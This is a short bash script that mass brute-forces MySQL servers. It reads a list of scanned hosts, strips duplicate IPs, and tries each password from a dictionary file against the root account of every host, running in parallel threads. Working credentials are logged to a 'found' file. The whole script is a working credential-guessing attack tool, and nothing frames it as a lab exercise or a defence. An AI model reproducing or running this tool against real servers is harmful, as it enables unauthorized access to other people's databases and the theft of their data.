#!/bin/bash

# mysql bash bruteforcer
# author by lucidtrip (aka bop the porn master)
# date: 08/07/2018
# function: bruteforce mysql 
# last 26/07/2018
#      - add config for threading and timeout

# config
readonly THREADS=15
readonly TIMEOUT=40

if [ -z "$1" ]; then
    echo "USAGE: start with a result file with the hosts or ips"
    echo "> bash $0 mysql-results.txt"
elif [ -s "$1" ]; then
    readonly MYSQLFILE="$1"
    # if first argv a file and is not zero size
    xargs -i -a "$MYSQLFILE" -n 1 -P ${THREADS} echo "{}" | awk -F ":" '{print $1}' >  result_mysql-cut.txt
    cat result_mysql-cut.txt | sort | uniq > result_mysql-cut2.txt
    rm result_mysql-cut.txt
    mv result_mysql-cut2.txt result_mysql-cut.txt
    xargs -i -a result_mysql-cut.txt -n 1 -P 5 bash "$0" "{}" txt/pass_pma.txt root > "${0}-mysqlbrute.log"
else
    readonly HOSTNAME="$1"
    readonly PASSDIC="$2"
    if [ -z "$3" ]; then
       readonly USER="root"
    else
       readonly USER="$3"
    fi

    echo "$(date): check ${HOSTNAME} with ${USER}:${PASSDIC}" >> "${0}.log"
    
    cat "$PASSDIC" | while read line
    do
       if [ -z "$line" ]; then
          continue
       fi
       line=$(echo "$line" |tr -d "\n")
       echo "$line"
       echo "$(date): check ${HOSTNAME} with ${USER}:${line}" >> "${0}_user-pass.log"
       mysqlbf=$(mysql --connect-timeout=${TIMEOUT} -h"${HOSTNAME}" -u"${USER}" -p"${line}" -e "show databases")
       #echo "$mysqlbf"
       if [[ $mysqlbf = *"Database"* ]]; then
           echo "${HOSTNAME}@${USER}:${line}" >> "${0}-found.txt"
       fi
    done

    #cat found.txt
fi

#EOF
